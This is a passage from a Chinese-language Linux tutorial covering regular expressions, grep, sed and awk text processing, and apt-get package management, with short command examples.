<code>z</code> 范围内的任意小写字母字符。</td></tr><tr><td><code>[^a-z]</code></td><td>排除型的字符范围。<strong>匹配任何不在指定范围内的任意字符</strong>。例如，<code>[^a-z]</code> 可以匹配任何不在 <code>a</code> 到 <code>z</code> 范围内的任意字符。</td></tr></tbody></table><h4 id="优先级">优先级</h4><p>优先级为从上到下从左到右，依次降低：</p><table><thead><tr><th>运算符</th><th>说明</th></tr></thead><tbody><tr><td><code>\</code></td><td>转义符</td></tr><tr><td><code>()</code>，<code>(?:)</code>，<code>(?=)</code>，<code>[]</code></td><td>括号和中括号</td></tr><tr><td><code>*</code>，<code>+</code>，<code>?</code>，<code>&#123;n&#125;</code>，<code>&#123;n,&#125;</code>，<code>&#123;n,m&#125;</code></td><td>限定符</td></tr><tr><td><code>^</code>，<code>$</code>，<code>\</code> 任何元字符</td><td>定位点和序列</td></tr><tr><td>｜</td><td>选择</td></tr></tbody></table><p>更多正则表达式的内容可以参考以下链接：</p><ul><li><a href="http://zh.wikipedia.org/wiki/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F">正则表达式 wiki</a></li><li><a href="http://www.greenend.org.uk/rjk/tech/regexp.html">几种正则表达式引擎的语法差异</a></li><li><a href="http://en.wikipedia.org/wiki/Comparison_of_regular_expression_engines">各语言各平台对正则表达式的支持</a></li></ul><p>regex 的思导图：</p><p><img src="https://doc.shiyanlou.com/linux_base/RegularExpression.png" alt="pic"></p><h3 id="基本操作">基本操作</h3><p><code>grep</code> 命令用于打印输出文本中匹配的模式串，它使用正则表达式作为模式匹配的条件。<code>grep</code> 支持三种正则表达式引擎，分别用三个参数指定：</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>-E</code></td><td>POSIX 扩展正则表达式，ERE</td></tr><tr><td><code>-G</code></td><td>POSIX 基本正则表达式，BRE</td></tr><tr><td><code>-P</code></td><td>Perl 正则表达式，PCRE</td></tr></tbody></table><p>不过在你没学过 perl 语言的大多数情况下你将只会使用到 <code>ERE</code> 和 <code>BRE</code>，所以我们接下来的内容都不会讨论到 PCRE 中特有的一些正则表达式语法（它们之间大部分内容是存在交集的，所以你不用担心会遗漏多少重要内容）。</p><p>在通过<code>grep</code>命令使用正则表达式之前，先介绍一下它的常用参数：</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>-b</code></td><td>将二进制文件作为文本来进行匹配</td></tr><tr><td><code>-c</code></td><td>统计以模式匹配的数目，可以用于统计文本中某个字符串出现的次数</td></tr><tr><td><code>-i</code></td><td>忽略大小写</td></tr><tr><td><code>-n</code></td><td>显示匹配文本所在行的行号</td></tr><tr><td><code>-v</code></td><td>反选，输出不匹配行的内容</td></tr><tr><td><code>-r</code></td><td>递归匹配查找</td></tr><tr><td><code>-A n</code></td><td>n 为正整数，表示 after 的意思，除了列出匹配行之外，还列出后面的 n 行</td></tr><tr><td><code>-B n</code></td><td>n 为正整数，表示 before 的意思，除了列出匹配行之外，还列出前面的 n 行</td></tr><tr><td><code>--color=auto</code></td><td>将输出中的匹配项设置为自动颜色显示</td></tr></tbody></table><blockquote><p>注：在大多数发行版中是默认设置了 grep 的颜色的，你可以通过参数指定或修改<code>GREP_COLOR</code>环境变量。</p></blockquote><h3 id="基本正则表达式的使用-BRE">基本正则表达式的使用 (BRE)</h3><h4 id="查找位置">查找位置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep [查找内容] [查找目标、路径]<br></code></pre></td></tr></table></figure><h4 id="查找数量">查找数量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 将匹配以&#x27;z&#x27;开头以&#x27;o&#x27;结尾的所有字符串</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;zero\nzo\nzoo&#x27;</span> | grep <span class="hljs-string">&#x27;z.*o&#x27;</span><br><span class="hljs-comment"># 将匹配以&#x27;z&#x27;开头以&#x27;o&#x27;结尾，中间包含一个任意字符的字符串</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;zero\nzo\nzoo&#x27;</span> | grep <span class="hljs-string">&#x27;z.o&#x27;</span><br><span class="hljs-comment"># 将匹配以&#x27;z&#x27;开头，以任意多个&#x27;o&#x27;结尾的字符串</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;zero\nzo\nzoo&#x27;</span> | grep <span class="hljs-string">&#x27;zo*&#x27;</span><br></code></pre></td></tr></table></figure><p>注意：其中 <code>\n</code> 为换行符</p><h3 id="进行选择">进行选择</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># grep默认是区分大小写的，这里将匹配所有的小写字母</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;1234\nabcd&#x27;</span> | grep <span class="hljs-string">&#x27;[a-z]&#x27;</span><br><span class="hljs-comment"># 将匹配所有的数字</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;1234\nabcd&#x27;</span> | grep <span class="hljs-string">&#x27;[0-9]&#x27;</span><br><span class="hljs-comment"># 将匹配所有的数字</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;1234\nabcd&#x27;</span> | grep <span class="hljs-string">&#x27;[[:digit:]]&#x27;</span><br><span class="hljs-comment"># 将匹配所有的小写字母</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;1234\nabcd&#x27;</span> | grep <span class="hljs-string">&#x27;[[:lower:]]&#x27;</span><br><span class="hljs-comment"># 将匹配所有的大写字母</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;1234\nabcd&#x27;</span> | grep <span class="hljs-string">&#x27;[[:upper:]]&#x27;</span><br><span class="hljs-comment"># 将匹配所有的字母和数字，包括0-9，a-z，A-Z</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;1234\nabcd&#x27;</span> | grep <span class="hljs-string">&#x27;[[:alnum:]]&#x27;</span><br><span class="hljs-comment"># 将匹配所有的字母</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;1234\nabcd&#x27;</span> | grep <span class="hljs-string">&#x27;[[:alpha:]]&#x27;</span><br></code></pre></td></tr></table></figure><p>下面包含完整的特殊符号及说明：</p><table><thead><tr><th>特殊符号</th><th>说明</th></tr></thead><tbody><tr><td><code>[:alnum:]</code></td><td>代表英文大小写字母及数字，亦即 0-9，A-Z，a-z</td></tr><tr><td><code>[:alpha:]</code></td><td>代表任何英文大小写字母，亦即 A-Z，a-z</td></tr><tr><td><code>[:blank:]</code></td><td>代表空白键与 <code>[Tab]</code> 按键两者</td></tr><tr><td><code>[:cntrl:]</code></td><td>代表键盘上面的控制按键，亦即包括 CR，LF，Tab，Del…</td></tr><tr><td><code>[:digit:]</code></td><td>代表数字而已，亦即 0-9</td></tr><tr><td><code>[:graph:]</code></td><td>除了空白字节（空白键与 [Tab] 按键）外的其他所有按键</td></tr><tr><td><code>[:lower:]</code></td><td>代表小写字母，亦即 a-z</td></tr><tr><td><code>[:print:]</code></td><td>代表任何可以被列印出来的字符</td></tr><tr><td><code>[:punct:]</code></td><td>代表标点符号（punctuation symbol），即：<code>&quot;</code>，<code>'</code>，<code>?</code>，<code>!</code>，<code>;</code>，<code>:</code>，<code>#</code>，<code>$</code>…</td></tr><tr><td><code>[:upper:]</code></td><td>代表大写字母，亦即 A-Z</td></tr><tr><td><code>[:space:]</code></td><td>任何会产生空白的字符，包括空格键，<code>[Tab]</code>，CR 等等</td></tr><tr><td><code>[:xdigit:]</code></td><td>代表 16 进位的数字类型，因此包括： 0-9，A-F，a-f 的数字与字节</td></tr></tbody></table><blockquote><p><strong>注意</strong>：之所以要使用特殊符号，是因为上面的 <code>[a-z]</code> 不是在所有情况下都管用，这还与主机当前的语系有关，即设置在 <code>LANG</code> 环境变量的值，<code>zh_CN.UTF-8</code> 的话 <code>[a-z]</code>，即为所有小写字母，其它语系可能是大小写交替的如，“a A b B…z Z”，<code>[a-z]</code> 中就可能包含大写字母。所以在使用 <code>[a-z]</code> 时请确保当前语系的影响，使用 <code>[:lower:]</code> 则不会有这个问题。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 排除字符</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;geek\ngood&#x27;</span> | grep <span class="hljs-string">&#x27;[^o]&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>当 <code>^</code> 放到中括号内为排除字符，否则表示行首。</p></blockquote><h3 id="扩展正则表达式的使用-ERE">扩展正则表达式的使用 (ERE)</h3><p>要通过 <code>grep</code> 使用扩展正则表达式需要加上 <code>-E</code> 参数，或使用 <code>egrep</code>。</p><ul><li>数量</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 只匹配&quot;zo&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;zero\nzo\nzoo&#x27;</span> | grep -E <span class="hljs-string">&#x27;zo&#123;1&#125;&#x27;</span><br><span class="hljs-comment"># 匹配以&quot;zo&quot;开头的所有单词</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;zero\nzo\nzoo&#x27;</span> | grep -E <span class="hljs-string">&#x27;zo&#123;1,&#125;&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>推荐掌握 <code>&#123;n,m&#125;</code> 即可 <code>+</code>，<code>?</code>，<code>*</code> 这几个不太直观，且容易弄混淆。</p></blockquote><ul><li>选择</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 匹配&quot;www.shiyanlou.com&quot;和&quot;www.google.com&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;www.shiyanlou.com\nwww.baidu.com\nwww.google.com&#x27;</span> | grep -E <span class="hljs-string">&#x27;www\.(shiyanlou|google)\.com&#x27;</span><br><span class="hljs-comment"># 或者匹配不包含&quot;baidu&quot;的内容</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;www.shiyanlou.com\nwww.baidu.com\nwww.google.com&#x27;</span> | grep -Ev <span class="hljs-string">&#x27;www\.baidu\.com&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>因为 <code>.</code> 号有特殊含义，所以需要转义。</p></blockquote><h2 id="sed-编辑器">sed 编辑器</h2><h3 id="常用参数">常用参数</h3><p>sed 命令基本格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sed [参数]... [执行命令] [输入文件]...<br><span class="hljs-comment"># 形如：</span><br>$ sed -i <span class="hljs-string">&#x27;s/sad/happy/&#x27;</span> <span class="hljs-built_in">test</span> <span class="hljs-comment"># 表示将test文件中的&quot;sad&quot;替换为&quot;happy&quot;</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>-n</code></td><td>安静模式，只打印受影响的行，默认打印输入数据的全部内容</td></tr><tr><td><code>-e</code></td><td>用于在脚本中添加多个执行命令一次执行，在命令行中执行多个命令通常不需要加该参数</td></tr><tr><td><code>-f filename</code></td><td>指定执行 filename 文件中的命令</td></tr><tr><td><code>-r</code></td><td>使用扩展正则表达式，默认为标准正则表达式</td></tr><tr><td><code>-i</code></td><td>将直接修改输入文件内容，而不是打印到标准输出设备</td></tr></tbody></table><h3 id="执行命令">执行命令</h3><p>sed 执行命令格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[n1][,n2]<span class="hljs-built_in">command</span><br>[n1][~step]<span class="hljs-built_in">command</span><br></code></pre></td></tr></table></figure><p>其中一些命令可以在后面加上作用范围，形如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sed -i <span class="hljs-string">&#x27;s/sad/happy/g&#x27;</span> <span class="hljs-built_in">test</span> <span class="hljs-comment"># g 表示全局范围</span><br>sed -i <span class="hljs-string">&#x27;s/sad/happy/4&#x27;</span> <span class="hljs-built_in">test</span> <span class="hljs-comment"># 4 表示指定行中的第四个匹配字符串</span><br></code></pre></td></tr></table></figure><p>其中 <code>n1,n2</code> 表示输入内容的行号，它们之间为 <code>,</code> 逗号则表示从 n1 到 n2 行，如果为 <code>~</code> 波浪号则表示从 n1 开始以 step 为步进的所有行；command 为执行动作，下面为一些常用动作指令：</p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td><code>s</code></td><td>行内替换</td></tr><tr><td><code>c</code></td><td>整行替换</td></tr><tr><td><code>a</code></td><td>插入到指定行的后面</td></tr><tr><td><code>i</code></td><td>插入到指定行的前面</td></tr><tr><td><code>p</code></td><td>打印指定行，通常与 <code>-n</code> 参数配合使用</td></tr><tr><td><code>d</code></td><td>删除指定行</td></tr></tbody></table><h3 id="操作举例-5">操作举例</h3><h4 id="打印指定行">打印指定行</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 打印2-5行</span><br>nl passwd | sed -n <span class="hljs-string">&#x27;2,5p&#x27;</span><br><span class="hljs-comment"># 打印奇数行</span><br>nl passwd | sed -n <span class="hljs-string">&#x27;1~2p&#x27;</span><br><span class="hljs-comment">#&#x27;1~2p&#x27;表示从第一行开始,每次往下读取两行</span><br></code></pre></td></tr></table></figure><h4 id="行内替换">行内替换</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 将输入文本中&quot;shiyanlou&quot; 全局替换为&quot;hehe&quot;，并只打印替换的那一行，注意这里不能省略最后的&quot;p&quot;命令</span><br>sed -n <span class="hljs-string">&#x27;s/shiyanlou/hehe/gp&#x27;</span> passwd<br></code></pre></td></tr></table></figure><blockquote><p>行内替换可以结合正则表达式使用。</p></blockquote><h4 id="删除某行">删除某行</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nl passwd | grep <span class="hljs-string">&quot;shiyanlou&quot;</span><br><span class="hljs-comment"># 删除第30行</span><br>sed -i <span class="hljs-string">&#x27;30d&#x27;</span> passwd<br></code></pre></td></tr></table></figure><p>更多 sed 的高级用法，你可以参看如下链接：</p><ul><li><a href="http://coolshell.cn/articles/9104.html">sed 简明教程</a></li><li><a href="http://sed.sourceforge.net/sed1line_zh-CN.html">sed 单行脚本快速参考</a></li><li><a href="http://www.gnu.org/software/sed/manual/sed.html">sed 完全手册</a></li></ul><h2 id="awk-文本处理语言">awk 文本处理语言</h2><h3 id="基础概念">基础概念</h3><p>awk 所有的操作都是基于 pattern(模式)—action(动作)对来完成的，如下面的形式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pattern &#123;action&#125;<br></code></pre></td></tr></table></figure><p>你可以看到就如同很多编程语言一样，它将所有的动作操作用一对 <code>&#123;&#125;</code> 花括号包围起来。其中 pattern 通常是表示用于匹配输入的文本的“关系式”或“正则表达式”，action 则是表示匹配后将执行的动作。在一个完整 awk 操作中，这两者可以只有其中一个，如果没有 pattern 则默认匹配输入的全部文本，如果没有 action 则默认为打印匹配内容到屏幕。</p><p><code>awk</code> 处理文本的方式，是将文本分割成一些“字段”，然后再对这些字段进行处理，默认情况下，awk 以空格作为一个字段的分割符，不过这不是固定的，你可以任意指定分隔符。</p><h3 id="基本命令格式">基本命令格式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">awk [-F fs] [-v var=value] [-f prog-file | <span class="hljs-string">&#x27;program text&#x27;</span>] [file...]<br></code></pre></td></tr></table></figure><p>其中 <code>-F</code> 参数用于预先指定前面提到的字段分隔符（还有其他指定字段的方式），<code>-v</code> 用于预先为 <code>awk</code> 程序指定变量，<code>-f</code> 参数用于指定 <code>awk</code> 命令要执行的程序文件，或者在不加 <code>-f</code> 参数的情况下直接将程序语句放在这里，最后为 <code>awk</code> 需要处理的文本输入，且可以同时输入多个文本文件。</p><h3 id="文本输出">文本输出</h3><p>使用 awk 将文本内容打印到终端：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># &quot;quote&gt;&quot; 不用输入</span><br>awk <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">quote&gt; print</span><br><span class="hljs-string">quote&gt; &#125;&#x27;</span> <span class="hljs-built_in">test</span><br><span class="hljs-comment"># 或者写到一行</span><br>awk <span class="hljs-string">&#x27;&#123;print&#125;&#x27;</span> <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>在这个操作中是省略了 <code>pattern</code>，所以 <code>awk</code> 会默认匹配输入文本的全部内容，然后在 <code>&#123;&#125;</code> 花括号中执行动作，即 <code>print</code> 打印所有匹配项，这里是全部文本内容。</p><h3 id="字段替换">字段替换</h3><ul><li>将第一行的每个字段单独显示为一行：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ awk <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">&gt; if(NR==1)&#123;</span><br><span class="hljs-string">&gt; print $1 &quot;\n&quot; $2 &quot;\n&quot; $3</span><br><span class="hljs-string">&gt; &#125; else &#123;</span><br><span class="hljs-string">&gt; print&#125;</span><br><span class="hljs-string">&gt; &#125;&#x27;</span> <span class="hljs-built_in">test</span><br><br><span class="hljs-comment"># 或者</span><br>$ awk <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">&gt; if(NR==1)&#123;</span><br><span class="hljs-string">&gt; OFS=&quot;\n&quot;</span><br><span class="hljs-string">&gt; print $1, $2, $3</span><br><span class="hljs-string">&gt; &#125; else &#123;</span><br><span class="hljs-string">&gt; print&#125;</span><br><span class="hljs-string">&gt; &#125;&#x27;</span> <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>说明:你首先应该注意的是，这里我使用了 <code>awk</code> 语言的分支选择语句<code>if</code>，它的使用和很多高级语言如 <code>C/C++</code> 语言基本一致，如果你有这些语言的基础，这里将很好理解。另一个你需要注意的是 <code>NR</code> 与 <code>OFS</code>，这两个是 <code>awk</code> 内建的变量，<code>NR</code> 表示当前读入的记录数，你可以简单的理解为当前处理的行数，<code>OFS</code> 表示输出时的字段分隔符，默认为&quot; &quot;空格，如上图所见，我们将字段分隔符设置为 <code>\n</code> 换行符，所以第一行原本以空格为字段分隔的内容就分别输出到单独一行了。然后是 <code>$N</code> 其中 N 为相应的字段号，这也是 <code>awk</code> 的内建变量，它表示引用相应的字段，因为我们这里第一行只有三个字段，所以只引用到了 <code>$3</code>。除此之外另一个这里没有出现的 <code>$0</code>，它表示引用当前记录（当前行）的全部内容。</p><ul><li>将第二行的以点为分段的字段换成以空格为分隔：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sh">awk -F<span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">&gt; if(NR==2)&#123;</span><br><span class="hljs-string">&gt; print $1 &quot;\t&quot; $2 &quot;\t&quot; $3</span><br><span class="hljs-string">&gt; &#125;&#125;&#x27;</span> <span class="hljs-built_in">test</span><br><br><span class="hljs-comment"># 或者</span><br>awk <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&gt; BEGIN&#123;</span><br><span class="hljs-string">&gt; FS=&quot;.&quot;</span><br><span class="hljs-string">&gt; OFS=&quot;\t&quot;  # 如果写为一行，两个动作语句之间应该以&quot;;&quot;号分开</span><br><span class="hljs-string">&gt; &#125;&#123;</span><br><span class="hljs-string">&gt; if(NR==2)&#123;</span><br><span class="hljs-string">&gt; print $1, $2, $3</span><br><span class="hljs-string">&gt; &#125;&#125;&#x27;</span> <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>说明：这里的 <code>-F</code> 参数，前面已经介绍过，它是用来预先指定待处理记录的字段分隔符。我们需要注意的是除了指定 <code>OFS</code> 我们还可以在 <code>print</code> 语句中直接打印特殊符号如这里的 <code>\t</code>，<strong>print 打印的非变量内容都需要用&quot;&quot;一对引号包围起来</strong>。上面另一个版本，展示了实现预先指定变量分隔符的另一种方式，即使用 <code>BEGIN</code>，就这个表达式指示了，其后的动作将在所有动作之前执行，这里是 <code>FS</code> 赋值了新的 <code>.</code> 点号代替默认的空格。</p><p><strong>注意</strong>:首先说明一点，我们在学习和使用 awk 的时候应该尽可能将其作为一门程序语言来理解，这样将会使你学习起来更容易，所以初学阶段在练习 <code>awk</code> 时应该尽量按照我那样的方式分多行按照一般程序语言的换行和缩进来输入，而不是全部写到一行（当然这在你熟练了之后是没有任何问题的）。</p><h3 id="内置变量">内置变量</h3><table><thead><tr><th>变量名</th><th>说明</th></tr></thead><tbody><tr><td><code>FILENAME</code></td><td>当前输入文件名，若有多个文件，则只表示第一个。如果输入是来自标准输入，则为空字符串</td></tr><tr><td><code>$0</code></td><td>当前记录的内容</td></tr><tr><td><code>$N</code></td><td>N 表示字段号，最大值为<code>NF</code>变量的值</td></tr><tr><td><code>FS</code></td><td>字段分隔符，由正则表达式表示，默认为空格</td></tr><tr><td><code>RS</code></td><td>输入记录分隔符，默认为 <code>\n</code>，即一行为一个记录</td></tr><tr><td><code>NF</code></td><td>当前记录字段数</td></tr><tr><td><code>NR</code></td><td>已经读入的记录数</td></tr><tr><td><code>FNR</code></td><td>当前输入文件的记录数，请注意它与 NR 的区别</td></tr><tr><td><code>OFS</code></td><td>输出字段分隔符，默认为空格</td></tr><tr><td><code>ORS</code></td><td>输出记录分隔符，默认为 <code>\n</code></td></tr></tbody></table><h2 id="软件安装">软件安装</h2><h3 id="apt-包管理介绍">apt 包管理介绍</h3><p>当你在执行安装操作时，首先 <code>apt-get</code> 工具会在<strong>本地</strong>的一个数据库中搜索关于 <code>xxx</code> 软件的相关信息，并根据这些信息在相关的服务器上下载软件安装，这里大家可能会一个疑问：既然是在线安装软件，为啥会在本地的数据库中搜索？要解释这个问题就得提到几个名词了：</p><ul><li><strong>软件源镜像服务器</strong></li><li><strong>软件源</strong></li></ul><p>我们需要定期从服务器上下载一个软件包列表，使用 <code>sudo apt-get update</code> 命令来保持本地的软件包列表是最新的（有时你也需要手动执行这个操作，比如更换了软件源），而这个表里会有<strong>软件依赖</strong>信息的记录，对于软件依赖，我举个例子：我们安装 <code>xxx</code> 软件的时候，而这个软件需要 <code>libgc1c2</code> 这个软件包才能正常工作，这个时候 <code>apt-get</code> 在安装软件的时候会一并替我们安装了，以保证 <code>xxx</code> 能正常的工作。</p><h3 id="apt-get">apt-get</h3><p><code>apt-get</code> 是用于处理 <code>apt</code>包的公用程序集，我们可以用它来在线安装、卸载和升级软件包等，下面列出一些 <code>apt-get</code> 包含的常用的一些工具：</p><table><thead><tr><th>工具</th><th>说明</th></tr></thead><tbody><tr><td><code>install</code></td><td>其后加上软件包名，用于安装一个软件包</td></tr><tr><td><code>update</code></td><td>从软件源镜像服务器上下载/更新用于更新本地软件源的软件包列表</td></tr><tr><td><code>upgrade</code></td><td>升级本地可更新的全部软件包，但存在依赖问题时将不会升级，通常会在更新之前执行一次 <code>update</code></td></tr><tr><td><code>dist-upgrade</code></td><td>解决依赖关系并升级（存在一定危险性）</td></tr><tr><td><code>remove</code></td><td>移除已安装的软件包，包括与被移除软件包有依赖关系的软件包，但不包含软件包的配置文件</td></tr><tr><td><code>autoremove</code></td><td>移除之前被其他软件包依赖，但现在不再被使用的软件包</td></tr><tr><td><code>purge</code></td><td>与 remove 相同，但会完全移除软件包，包含其配置文件</td></tr><tr><td><code>clean</code></td><td>移除下载到本地的已经安装的软件包，默认保存在 <code>/var/cache/apt/archives/</code></td></tr><tr><td><code>autoclean</code></td><td>移除已安装的软件的旧版本软件包</td></tr></tbody></table><p>下面是一些<code>apt-get</code>常用的参数：</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>-y</code></td><td>自动回应是否安装软件包的选项，在一些自动化安装脚本中使用这个参数将十分有用</td></tr><tr><td><code>-s</code></td><td>模拟安装</td></tr><tr><td><code>-q</code></td><td>静默安装方式，指定多个 <code>q</code> 或者 <code>-q=#</code>，<code>#</code> 表示数字，用于设定静默级别，这在你不想要在安装软件包时屏幕输出过多时很有用</td></tr><tr><td><code>-f</code></td><td>修复损坏的依赖关系</td></tr><tr><td><code>-d</code></td><td>只下载不安装</td></tr><tr><td><code>--reinstall</code></td><td>重新安装已经安装但可能存在问题的软件包</td></tr><tr><td><code>--install-suggests</code></td><td>同时安装 APT 给出的建议安装的软件包</td></tr></tbody></table><h3 id="安装软件包">安装软件包</h3><p>关于安装，如前面演示的一样你只需要执行 <code>apt-get install &lt;packagename&gt;</code> 即可，除了这一点，你还应该掌握的是如何重新安装软件包。</p><p>很多时候我们需要重新安装一个软件包，比如你的系统被破坏，或者一些错误的配置导致软件无法正常工作。你可以使用如下方式重新安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get --reinstall install &lt;packagename&gt;<br></code></pre></td></tr></table></figure><p>在不知道软件包完整名的时候进行安装，通常我们使用 <code>Tab</code> 键补全软件包名。同时也可以利用正则表达式匹配软件包名进行批量安装。</p><h3 id="软件升级">软件升级</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 更新软件源</span><br>sudo apt-get update<br><br><span class="hljs-comment"># 升级没有依赖问题的软件包</span><br>sudo apt-get upgrade<br><br><span class="hljs-comment"># 升级并解决依赖关系</span><br>sudo apt-get dist-upgrade<br></code></pre></td></tr></table></figure><h3 id="软件卸载">软件卸载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get remove [软件包名]<br></code></pre></td></tr></table></figure><p>或者，你可以执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 不保留配置文件的移除</span><br>sudo apt-get purge [软件包名]<br><span class="hljs-comment"># 或者</span><br>sudo apt-get --purge remove [软件包名]<br><span class="hljs-comment"># 移除不再需要的被依赖的软件包</span><br>sudo apt-get autoremove<br></code></pre></td></tr></table></figure><h3 id="软件搜索">软件搜索</h3><p>当自己刚知道了一个软件，想下载使用，需要确认软件仓库里面有没有，就需要用到搜索功能了，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-cache search softname1 softname2 softname3……<br></code></pre></td></tr></table></figure><p><code>apt-cache</code> 命令则是针对本地数据进行相关操作的工具，<code>search</code> 顾名思义在本地的数据库中寻找有关 <code>softname1</code>，<code>softname2</code> 相关软件的信息。</p><h2 id="dpkg-使用">dpkg 使用</h2><h3 id="dpkg-介绍">dpkg 